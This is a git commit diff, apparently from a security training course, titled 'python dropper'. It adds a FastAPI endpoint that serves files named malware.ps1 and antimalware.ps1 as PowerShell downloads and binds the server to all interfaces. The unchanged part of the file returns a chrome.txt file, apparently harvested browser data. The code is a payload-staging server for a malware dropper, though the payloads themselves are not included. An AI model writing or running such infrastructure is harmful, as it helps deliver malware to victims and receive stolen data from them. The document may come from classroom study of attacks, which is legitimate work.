499e6befd90ac99a1fd6d4ce40a1a81990a1fdfd
Qwuaa <arthur.beaupere@iia-formation.fr>
2025-04-03 16:20:24 +0200

    python dropper

--- main.py
+++ main.py
@@ -1,6 +1,7 @@
-from fastapi import FastAPI
+from typing import Annotated
+from fastapi import FastAPI, Path
 from fastapi.responses import FileResponse
-from pathlib import Path
+from pathlib import Path as PathLibPath
 from fastapi.middleware.cors import CORSMiddleware
 
 app = FastAPI()
@@ -22,3 +23,14 @@ async def root():
         return FileResponse(path=target_path, filename="chrome.txt", media_type="application/json")
     else:
         return {"message": "rien"}
+    
+@app.get("/download/{filename}")
+async def download_file(filename: Annotated[str, Path(title="file to download")]):
+    target_path = PathLibPath(f"./{filename}")
+    if filename in ("malware.ps1", "antimalware.ps1") and target_path.is_file():
+        return FileResponse(path=target_path, media_type='application/ps1', filename=filename)
+    return {"error": "Fichier not Found"}
+
+if __name__ == "__main__":
+    import uvicorn
+    uvicorn.run(app, host="0.0.0.0", port=8000)
